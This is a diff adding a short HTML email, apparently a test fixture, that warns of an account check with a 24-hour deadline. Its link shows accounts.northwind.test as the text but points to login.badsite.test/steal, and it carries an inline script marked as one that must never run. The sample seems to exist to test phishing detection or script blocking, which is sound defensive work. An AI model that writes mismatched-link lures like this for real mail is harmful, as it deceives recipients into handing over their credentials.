@@ -1,0 +1,8 @@
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Your account needs a check. Please sign in within 24 hours:</p>
+<p><a href="https://login.badsite.test/steal">https://accounts.northwind.test/verify</a></p>
+<script>document.title = "this must never run"</script>
+</body></html>
